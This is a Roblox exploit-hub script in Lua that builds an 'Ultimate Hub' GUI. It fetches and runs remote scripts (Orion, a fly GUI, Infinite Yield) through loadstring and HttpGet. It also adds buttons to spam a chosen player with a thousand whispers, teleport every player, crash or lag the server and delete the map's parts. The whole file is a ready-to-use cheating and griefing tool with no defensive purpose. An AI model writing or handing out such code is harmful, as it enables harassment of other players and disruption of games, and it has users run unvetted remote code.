local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()

local Window = OrionLib:MakeWindow({
    Name = "🔥 Ultimate Hub",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionConfig",
    IntroEnabled = true,
    IntroText = "ULTIMATE HUB"
})

-- Main Tab
local MainTab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Player Tab
local PlayerTab = Window:MakeTab({
    Name = "Players",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Server Tab
local ServerTab = Window:MakeTab({
    Name = "Server",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- MAIN TAB
MainTab:AddButton({
    Name = "Fly (X)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGui/main/FlyGui.lua"))()
    end
})

MainTab:AddButton({
    Name = "Infinite Yield",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end
})

-- PLAYER TAB
local SelectedPlayer = nil
local Dropdown = PlayerTab:AddDropdown({
    Name = "Select Player",
    Default = "None",
    Options = {},
    Callback = function(Value)
        SelectedPlayer = Value
    end
})

-- Update player list
local function UpdatePlayers()
    local players = {}
    for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v ~= game.Players.LocalPlayer then
            table.insert(players, v.Name)
        end
    end
    Dropdown:Refresh(players, true)
end

UpdatePlayers()
game:GetService("Players").PlayerAdded:Connect(UpdatePlayers)
game:GetService("Players").PlayerRemoving:Connect(UpdatePlayers)

PlayerTab:AddButton({
    Name = "Flood Ping Player",
    Callback = function()
        if SelectedPlayer then
            for i = 1, 1000 do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..SelectedPlayer.." "..string.rep("PING ", 50), "All")
                wait(0.01)
            end
        end
    end
})

PlayerTab:AddButton({
    Name = "Bring All Players To Me",
    Callback = function()
        local localChar = game.Players.LocalPlayer.Character
        if localChar and localChar:FindFirstChild("HumanoidRootPart") then
            for i,v in pairs(game:GetService("Players"):GetPlayers()) do
                if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                    v.Character.HumanoidRootPart.CFrame = localChar.HumanoidRootPart.CFrame
                end
            end
        end
    end
})

-- SERVER TAB
ServerTab:AddButton({
    Name = "Crash Server (Heavy)",
    Callback = function()
        while true do
            for i = 1, 100 do
                local part = Instance.new("Part")
                part.Parent = workspace
                part.Size = Vector3.new(100, 100, 100)
                part.Position = Vector3.new(0, 500, 0)
                part.Anchored = true
                part.Material = Enum.Material.Neon
            end
            wait()
        end
    end
})

ServerTab:AddButton({
    Name = "Server Lag",
    Callback = function()
        for i = 1, 500 do
            local b = Instance.new("BodyPosition")
            b.Parent = workspace
            b.Position = Vector3.new(0, 1000, 0)
        end
    end
})

ServerTab:AddButton({
    Name = "Delete All Parts",
    Callback = function()
        for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("Part") then
                v:Destroy()
            end
        end
    end
})

-- Init
OrionLib:Init()
